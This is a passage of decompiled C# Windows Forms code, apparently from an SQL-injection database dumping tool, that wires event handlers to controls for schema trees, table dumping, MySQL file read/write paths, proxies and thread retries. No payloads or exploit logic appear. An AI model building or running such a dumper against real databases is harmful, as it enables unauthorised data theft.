			ToolStripMenuItem toolStripMenuItem = this._mnuCopyAllSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCopyAllSchema = value;
			toolStripMenuItem = this._mnuCopyAllSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001CA RID: 458
	// (get) Token: 0x0600056C RID: 1388 RVA: 0x00023274 File Offset: 0x00021474
	// (set) Token: 0x0600056D RID: 1389 RVA: 0x0002327C File Offset: 0x0002147C
	internal virtual ToolStripSeparator mnuTreeSP2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001CB RID: 459
	// (get) Token: 0x0600056E RID: 1390 RVA: 0x00023288 File Offset: 0x00021488
	// (set) Token: 0x0600056F RID: 1391 RVA: 0x00023290 File Offset: 0x00021490
	internal virtual ToolStripMenuItem mnuClearNodes
	{
		[CompilerGenerated]
		get
		{
			return this._mnuClearNodes;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_66);
			ToolStripMenuItem toolStripMenuItem = this._mnuClearNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuClearNodes = value;
			toolStripMenuItem = this._mnuClearNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001CC RID: 460
	// (get) Token: 0x06000570 RID: 1392 RVA: 0x000232D4 File Offset: 0x000214D4
	// (set) Token: 0x06000571 RID: 1393 RVA: 0x000232DC File Offset: 0x000214DC
	internal virtual ToolStripMenuItem mnuClearSchema
	{
		[CompilerGenerated]
		get
		{
			return this._mnuClearSchema;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_67);
			ToolStripMenuItem toolStripMenuItem = this._mnuClearSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuClearSchema = value;
			toolStripMenuItem = this._mnuClearSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001CD RID: 461
	// (get) Token: 0x06000572 RID: 1394 RVA: 0x00023320 File Offset: 0x00021520
	// (set) Token: 0x06000573 RID: 1395 RVA: 0x00023328 File Offset: 0x00021528
	internal virtual ToolStripSeparator mnuTreeSP3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001CE RID: 462
	// (get) Token: 0x06000574 RID: 1396 RVA: 0x00023334 File Offset: 0x00021534
	// (set) Token: 0x06000575 RID: 1397 RVA: 0x0002333C File Offset: 0x0002153C
	internal virtual ToolStripMenuItem mnuRemDB
	{
		[CompilerGenerated]
		get
		{
			return this._mnuRemDB;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_68);
			ToolStripMenuItem toolStripMenuItem = this._mnuRemDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuRemDB = value;
			toolStripMenuItem = this._mnuRemDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001CF RID: 463
	// (get) Token: 0x06000576 RID: 1398 RVA: 0x00023380 File Offset: 0x00021580
	// (set) Token: 0x06000577 RID: 1399 RVA: 0x00023388 File Offset: 0x00021588
	internal virtual ToolStripMenuItem mnuRemTable
	{
		[CompilerGenerated]
		get
		{
			return this._mnuRemTable;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_68);
			ToolStripMenuItem toolStripMenuItem = this._mnuRemTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuRemTable = value;
			toolStripMenuItem = this._mnuRemTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D0 RID: 464
	// (get) Token: 0x06000578 RID: 1400 RVA: 0x000233CC File Offset: 0x000215CC
	// (set) Token: 0x06000579 RID: 1401 RVA: 0x000233D4 File Offset: 0x000215D4
	internal virtual ToolStripMenuItem mnuRemColumn
	{
		[CompilerGenerated]
		get
		{
			return this._mnuRemColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_68);
			ToolStripMenuItem toolStripMenuItem = this._mnuRemColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuRemColumn = value;
			toolStripMenuItem = this._mnuRemColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D1 RID: 465
	// (get) Token: 0x0600057A RID: 1402 RVA: 0x00023418 File Offset: 0x00021618
	// (set) Token: 0x0600057B RID: 1403 RVA: 0x00023420 File Offset: 0x00021620
	internal virtual ToolStripSeparator mnuTreeSP5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001D2 RID: 466
	// (get) Token: 0x0600057C RID: 1404 RVA: 0x0002342C File Offset: 0x0002162C
	// (set) Token: 0x0600057D RID: 1405 RVA: 0x00023434 File Offset: 0x00021634
	internal virtual ToolStripMenuItem mnuAddDB
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAddDB;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_69);
			ToolStripMenuItem toolStripMenuItem = this._mnuAddDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuAddDB = value;
			toolStripMenuItem = this._mnuAddDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D3 RID: 467
	// (get) Token: 0x0600057E RID: 1406 RVA: 0x00023478 File Offset: 0x00021678
	// (set) Token: 0x0600057F RID: 1407 RVA: 0x00023480 File Offset: 0x00021680
	internal virtual ToolStripMenuItem mnuAddTable
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAddTable;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_69);
			ToolStripMenuItem toolStripMenuItem = this._mnuAddTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuAddTable = value;
			toolStripMenuItem = this._mnuAddTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D4 RID: 468
	// (get) Token: 0x06000580 RID: 1408 RVA: 0x000234C4 File Offset: 0x000216C4
	// (set) Token: 0x06000581 RID: 1409 RVA: 0x000234CC File Offset: 0x000216CC
	internal virtual ToolStripMenuItem mnuAddColumn
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAddColumn;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_69);
			ToolStripMenuItem toolStripMenuItem = this._mnuAddColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuAddColumn = value;
			toolStripMenuItem = this._mnuAddColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D5 RID: 469
	// (get) Token: 0x06000582 RID: 1410 RVA: 0x00023510 File Offset: 0x00021710
	// (set) Token: 0x06000583 RID: 1411 RVA: 0x00023518 File Offset: 0x00021718
	internal virtual ToolStripSeparator mnuTreeSP4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001D6 RID: 470
	// (get) Token: 0x06000584 RID: 1412 RVA: 0x00023524 File Offset: 0x00021724
	// (set) Token: 0x06000585 RID: 1413 RVA: 0x0002352C File Offset: 0x0002172C
	internal virtual ToolStripMenuItem mnuCollapseTree
	{
		[CompilerGenerated]
		get
		{
			return this._mnuCollapseTree;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_70);
			ToolStripMenuItem toolStripMenuItem = this._mnuCollapseTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuCollapseTree = value;
			toolStripMenuItem = this._mnuCollapseTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D7 RID: 471
	// (get) Token: 0x06000586 RID: 1414 RVA: 0x00023570 File Offset: 0x00021770
	// (set) Token: 0x06000587 RID: 1415 RVA: 0x00023578 File Offset: 0x00021778
	internal virtual ToolStripMenuItem mnuSortTree
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSortTree;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_71);
			ToolStripMenuItem toolStripMenuItem = this._mnuSortTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuSortTree = value;
			toolStripMenuItem = this._mnuSortTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001D8 RID: 472
	// (get) Token: 0x06000588 RID: 1416 RVA: 0x000235BC File Offset: 0x000217BC
	// (set) Token: 0x06000589 RID: 1417 RVA: 0x000235C4 File Offset: 0x000217C4
	internal virtual ToolStripLabel lblVersion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001D9 RID: 473
	// (get) Token: 0x0600058A RID: 1418 RVA: 0x000235D0 File Offset: 0x000217D0
	// (set) Token: 0x0600058B RID: 1419 RVA: 0x000235D8 File Offset: 0x000217D8
	internal virtual CheckBox chkAllInOneRequest
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001DA RID: 474
	// (get) Token: 0x0600058C RID: 1420 RVA: 0x000235E4 File Offset: 0x000217E4
	// (set) Token: 0x0600058D RID: 1421 RVA: 0x000235EC File Offset: 0x000217EC
	internal virtual CheckBox chkClearListOnGet
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001DB RID: 475
	// (get) Token: 0x0600058E RID: 1422 RVA: 0x000235F8 File Offset: 0x000217F8
	// (set) Token: 0x0600058F RID: 1423 RVA: 0x00023600 File Offset: 0x00021800
	internal virtual SplitContainer splWhere
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001DC RID: 476
	// (get) Token: 0x06000590 RID: 1424 RVA: 0x0002360C File Offset: 0x0002180C
	// (set) Token: 0x06000591 RID: 1425 RVA: 0x00023614 File Offset: 0x00021814
	internal virtual ToolStripLabel lblCountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001DD RID: 477
	// (get) Token: 0x06000592 RID: 1426 RVA: 0x00023620 File Offset: 0x00021820
	// (set) Token: 0x06000593 RID: 1427 RVA: 0x00023628 File Offset: 0x00021828
	internal virtual TabPage tpProxies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001DE RID: 478
	// (get) Token: 0x06000594 RID: 1428 RVA: 0x00023634 File Offset: 0x00021834
	// (set) Token: 0x06000595 RID: 1429 RVA: 0x0002363C File Offset: 0x0002183C
	internal virtual ToolStripMenuItem mnuAutoScroll
	{
		[CompilerGenerated]
		get
		{
			return this._mnuAutoScroll;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_144);
			ToolStripMenuItem toolStripMenuItem = this._mnuAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuAutoScroll = value;
			toolStripMenuItem = this._mnuAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001DF RID: 479
	// (get) Token: 0x06000596 RID: 1430 RVA: 0x00023680 File Offset: 0x00021880
	// (set) Token: 0x06000597 RID: 1431 RVA: 0x00023688 File Offset: 0x00021888
	internal virtual ToolStripSeparator tscSchemasSP3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E0 RID: 480
	// (get) Token: 0x06000598 RID: 1432 RVA: 0x00023694 File Offset: 0x00021894
	// (set) Token: 0x06000599 RID: 1433 RVA: 0x0002369C File Offset: 0x0002189C
	internal virtual ToolStripSeparator tscSchemasSP2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E1 RID: 481
	// (get) Token: 0x0600059A RID: 1434 RVA: 0x000236A8 File Offset: 0x000218A8
	// (set) Token: 0x0600059B RID: 1435 RVA: 0x000236B0 File Offset: 0x000218B0
	internal virtual TabPage tpMyLoadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E2 RID: 482
	// (get) Token: 0x0600059C RID: 1436 RVA: 0x000236BC File Offset: 0x000218BC
	// (set) Token: 0x0600059D RID: 1437 RVA: 0x000236C4 File Offset: 0x000218C4
	internal virtual GroupBox grbWriteFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E3 RID: 483
	// (get) Token: 0x0600059E RID: 1438 RVA: 0x000236D0 File Offset: 0x000218D0
	// (set) Token: 0x0600059F RID: 1439 RVA: 0x000236D8 File Offset: 0x000218D8
	internal virtual TextBox txtMySQLWriteFile
	{
		[CompilerGenerated]
		get
		{
			return this._txtMySQLWriteFile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_148);
			TextBox textBox = this._txtMySQLWriteFile;
			if (textBox != null)
			{
				textBox.Leave -= eventHandler;
			}
			this._txtMySQLWriteFile = value;
			textBox = this._txtMySQLWriteFile;
			if (textBox != null)
			{
				textBox.Leave += eventHandler;
			}
		}
	}

	// Token: 0x170001E4 RID: 484
	// (get) Token: 0x060005A0 RID: 1440 RVA: 0x0002371C File Offset: 0x0002191C
	// (set) Token: 0x060005A1 RID: 1441 RVA: 0x00023724 File Offset: 0x00021924
	internal virtual GroupBox grbLoadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E5 RID: 485
	// (get) Token: 0x060005A2 RID: 1442 RVA: 0x00023730 File Offset: 0x00021930
	// (set) Token: 0x060005A3 RID: 1443 RVA: 0x00023738 File Offset: 0x00021938
	internal virtual ToolStrip tsMySQLReadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E6 RID: 486
	// (get) Token: 0x060005A4 RID: 1444 RVA: 0x00023744 File Offset: 0x00021944
	// (set) Token: 0x060005A5 RID: 1445 RVA: 0x0002374C File Offset: 0x0002194C
	internal virtual ToolStripLabel lblReadPath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001E7 RID: 487
	// (get) Token: 0x060005A6 RID: 1446 RVA: 0x00023758 File Offset: 0x00021958
	// (set) Token: 0x060005A7 RID: 1447 RVA: 0x00023760 File Offset: 0x00021960
	internal virtual ToolStripTextBox txtMySQLReadFilePath
	{
		[CompilerGenerated]
		get
		{
			return this._txtMySQLReadFilePath;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_147);
			ToolStripTextBox toolStripTextBox = this._txtMySQLReadFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave -= eventHandler;
			}
			this._txtMySQLReadFilePath = value;
			toolStripTextBox = this._txtMySQLReadFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave += eventHandler;
			}
		}
	}

	// Token: 0x170001E8 RID: 488
	// (get) Token: 0x060005A8 RID: 1448 RVA: 0x000237A4 File Offset: 0x000219A4
	// (set) Token: 0x060005A9 RID: 1449 RVA: 0x000237AC File Offset: 0x000219AC
	internal virtual ToolStripButton btnMySQLReadFile
	{
		[CompilerGenerated]
		get
		{
			return this._btnMySQLReadFile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_88);
			ToolStripButton toolStripButton = this._btnMySQLReadFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnMySQLReadFile = value;
			toolStripButton = this._btnMySQLReadFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001E9 RID: 489
	// (get) Token: 0x060005AA RID: 1450 RVA: 0x000237F0 File Offset: 0x000219F0
	// (set) Token: 0x060005AB RID: 1451 RVA: 0x000237F8 File Offset: 0x000219F8
	internal virtual ToolStrip tsMySQLWriteFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001EA RID: 490
	// (get) Token: 0x060005AC RID: 1452 RVA: 0x00023804 File Offset: 0x00021A04
	// (set) Token: 0x060005AD RID: 1453 RVA: 0x0002380C File Offset: 0x00021A0C
	internal virtual ToolStripLabel lblWritePath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001EB RID: 491
	// (get) Token: 0x060005AE RID: 1454 RVA: 0x00023818 File Offset: 0x00021A18
	// (set) Token: 0x060005AF RID: 1455 RVA: 0x00023820 File Offset: 0x00021A20
	internal virtual ToolStripTextBox txtMySQLWriteFilePath
	{
		[CompilerGenerated]
		get
		{
			return this._txtMySQLWriteFilePath;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_149);
			ToolStripTextBox toolStripTextBox = this._txtMySQLWriteFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave -= eventHandler;
			}
			this._txtMySQLWriteFilePath = value;
			toolStripTextBox = this._txtMySQLWriteFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave += eventHandler;
			}
		}
	}

	// Token: 0x170001EC RID: 492
	// (get) Token: 0x060005B0 RID: 1456 RVA: 0x00023864 File Offset: 0x00021A64
	// (set) Token: 0x060005B1 RID: 1457 RVA: 0x0002386C File Offset: 0x00021A6C
	internal virtual ToolStripButton btnMySQLWriteFile
	{
		[CompilerGenerated]
		get
		{
			return this._btnMySQLWriteFile;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_89);
			ToolStripButton toolStripButton = this._btnMySQLWriteFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnMySQLWriteFile = value;
			toolStripButton = this._btnMySQLWriteFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001ED RID: 493
	// (get) Token: 0x060005B2 RID: 1458 RVA: 0x000238B0 File Offset: 0x00021AB0
	// (set) Token: 0x060005B3 RID: 1459 RVA: 0x000238B8 File Offset: 0x00021AB8
	internal virtual ToolStrip tlsMenu
	{
		[CompilerGenerated]
		get
		{
			return this._tlsMenu;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			ToolStripItemClickedEventHandler toolStripItemClickedEventHandler = new ToolStripItemClickedEventHandler(this.method_153);
			ToolStrip toolStrip = this._tlsMenu;
			if (toolStrip != null)
			{
				toolStrip.ItemClicked -= toolStripItemClickedEventHandler;
			}
			this._tlsMenu = value;
			toolStrip = this._tlsMenu;
			if (toolStrip != null)
			{
				toolStrip.ItemClicked += toolStripItemClickedEventHandler;
			}
		}
	}

	// Token: 0x170001EE RID: 494
	// (get) Token: 0x060005B4 RID: 1460 RVA: 0x000238FC File Offset: 0x00021AFC
	// (set) Token: 0x060005B5 RID: 1461 RVA: 0x00023904 File Offset: 0x00021B04
	internal virtual ToolStripButton btnPasteURL
	{
		[CompilerGenerated]
		get
		{
			return this._btnPasteURL;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_87);
			ToolStripButton toolStripButton = this._btnPasteURL;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= eventHandler;
			}
			this._btnPasteURL = value;
			toolStripButton = this._btnPasteURL;
			if (toolStripButton != null)
			{
				toolStripButton.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001EF RID: 495
	// (get) Token: 0x060005B6 RID: 1462 RVA: 0x00023948 File Offset: 0x00021B48
	// (set) Token: 0x060005B7 RID: 1463 RVA: 0x00023950 File Offset: 0x00021B50
	internal virtual ToolStripSeparator toolStripSeparator18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F0 RID: 496
	// (get) Token: 0x060005B8 RID: 1464 RVA: 0x0002395C File Offset: 0x00021B5C
	// (set) Token: 0x060005B9 RID: 1465 RVA: 0x00023964 File Offset: 0x00021B64
	internal virtual ToolStripComboBox cmbSqlType
	{
		[CompilerGenerated]
		get
		{
			return this._cmbSqlType;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_99);
			EventHandler eventHandler2 = new EventHandler(this.method_150);
			MouseEventHandler mouseEventHandler = new MouseEventHandler(this.method_154);
			ToolStripComboBox toolStripComboBox = this._cmbSqlType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged -= eventHandler;
				toolStripComboBox.Click -= eventHandler2;
				toolStripComboBox.MouseUp -= mouseEventHandler;
			}
			this._cmbSqlType = value;
			toolStripComboBox = this._cmbSqlType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged += eventHandler;
				toolStripComboBox.Click += eventHandler2;
				toolStripComboBox.MouseUp += mouseEventHandler;
			}
		}
	}

	// Token: 0x170001F1 RID: 497
	// (get) Token: 0x060005BA RID: 1466 RVA: 0x000239E0 File Offset: 0x00021BE0
	// (set) Token: 0x060005BB RID: 1467 RVA: 0x000239E8 File Offset: 0x00021BE8
	internal virtual ToolStripSeparator ToolStripSeparator2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F2 RID: 498
	// (get) Token: 0x060005BC RID: 1468 RVA: 0x000239F4 File Offset: 0x00021BF4
	// (set) Token: 0x060005BD RID: 1469 RVA: 0x000239FC File Offset: 0x00021BFC
	internal virtual NumericUpDown numSleepMultiThread
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F3 RID: 499
	// (get) Token: 0x060005BE RID: 1470 RVA: 0x00023A08 File Offset: 0x00021C08
	// (set) Token: 0x060005BF RID: 1471 RVA: 0x00023A10 File Offset: 0x00021C10
	internal virtual Label lblMultiThreadDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F4 RID: 500
	// (get) Token: 0x060005C0 RID: 1472 RVA: 0x00023A1C File Offset: 0x00021C1C
	// (set) Token: 0x060005C1 RID: 1473 RVA: 0x00023A24 File Offset: 0x00021C24
	internal virtual Label lblMultiThreadRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F5 RID: 501
	// (get) Token: 0x060005C2 RID: 1474 RVA: 0x00023A30 File Offset: 0x00021C30
	// (set) Token: 0x060005C3 RID: 1475 RVA: 0x00023A38 File Offset: 0x00021C38
	internal virtual NumericUpDown numMaxRetryMultiThread
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F6 RID: 502
	// (get) Token: 0x060005C4 RID: 1476 RVA: 0x00023A44 File Offset: 0x00021C44
	// (set) Token: 0x060005C5 RID: 1477 RVA: 0x00023A4C File Offset: 0x00021C4C
	internal virtual NumericUpDown numSleep
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F7 RID: 503
	// (get) Token: 0x060005C6 RID: 1478 RVA: 0x00023A58 File Offset: 0x00021C58
	// (set) Token: 0x060005C7 RID: 1479 RVA: 0x00023A60 File Offset: 0x00021C60
	internal virtual Label lblThreadDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F8 RID: 504
	// (get) Token: 0x060005C8 RID: 1480 RVA: 0x00023A6C File Offset: 0x00021C6C
	// (set) Token: 0x060005C9 RID: 1481 RVA: 0x00023A74 File Offset: 0x00021C74
	internal virtual Label lblThreadRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001F9 RID: 505
	// (get) Token: 0x060005CA RID: 1482 RVA: 0x00023A80 File Offset: 0x00021C80
	// (set) Token: 0x060005CB RID: 1483 RVA: 0x00023A88 File Offset: 0x00021C88
	internal virtual NumericUpDown numMaxRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001FA RID: 506
	// (get) Token: 0x060005CC RID: 1484 RVA: 0x00023A94 File Offset: 0x00021C94
	// (set) Token: 0x060005CD RID: 1485 RVA: 0x00023A9C File Offset: 0x00021C9C
	internal virtual NumericUpDown numTimeOut
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001FB RID: 507
	// (get) Token: 0x060005CE RID: 1486 RVA: 0x00023AA8 File Offset: 0x00021CA8
	// (set) Token: 0x060005CF RID: 1487 RVA: 0x00023AB0 File Offset: 0x00021CB0
	internal virtual Label lblTimout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001FC RID: 508
	// (get) Token: 0x060005D0 RID: 1488 RVA: 0x00023ABC File Offset: 0x00021CBC
	// (set) Token: 0x060005D1 RID: 1489 RVA: 0x00023AC4 File Offset: 0x00021CC4
	internal virtual Label lblDumperMaxRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001FD RID: 509
	// (get) Token: 0x060005D2 RID: 1490 RVA: 0x00023AD0 File Offset: 0x00021CD0
	// (set) Token: 0x060005D3 RID: 1491 RVA: 0x00023AD8 File Offset: 0x00021CD8
	internal virtual NumericUpDown numLimitMax
	{
		[CompilerGenerated]
		get
		{
			return this._numLimitMax;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_145);
			NumericUpDown numericUpDown = this._numLimitMax;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= eventHandler;
			}
			this._numLimitMax = value;
			numericUpDown = this._numLimitMax;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += eventHandler;
			}
		}
	}

	// Token: 0x170001FE RID: 510
	// (get) Token: 0x060005D4 RID: 1492 RVA: 0x00023B1C File Offset: 0x00021D1C
	// (set) Token: 0x060005D5 RID: 1493 RVA: 0x00023B24 File Offset: 0x00021D24
	internal virtual NumericUpDown numLimitX
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x170001FF RID: 511
	// (get) Token: 0x060005D6 RID: 1494 RVA: 0x00023B30 File Offset: 0x00021D30
	// (set) Token: 0x060005D7 RID: 1495 RVA: 0x00023B38 File Offset: 0x00021D38
	internal virtual Label lblDumperStartIndex
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000200 RID: 512
	// (get) Token: 0x060005D8 RID: 1496 RVA: 0x00023B44 File Offset: 0x00021D44
	// (set) Token: 0x060005D9 RID: 1497 RVA: 0x00023B4C File Offset: 0x00021D4C
	internal virtual CheckBox chkDumpWhere
	{
		[CompilerGenerated]
		get
		{
			return this._chkDumpWhere;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_119);
			CheckBox checkBox = this._chkDumpWhere;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= eventHandler;
			}
			this._chkDumpWhere = value;
			checkBox = this._chkDumpWhere;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += eventHandler;
			}
		}
	}

	// Token: 0x17000201 RID: 513
	// (get) Token: 0x060005DA RID: 1498 RVA: 0x00023B90 File Offset: 0x00021D90
	// (set) Token: 0x060005DB RID: 1499 RVA: 0x00023B98 File Offset: 0x00021D98
	internal virtual CheckBox chkDumpOrderBy
	{
		[CompilerGenerated]
		get
		{
			return this._chkDumpOrderBy;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_119);
			CheckBox checkBox = this._chkDumpOrderBy;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= eventHandler;
			}
			this._chkDumpOrderBy = value;
			checkBox = this._chkDumpOrderBy;
			if (checkBox != null)
			{
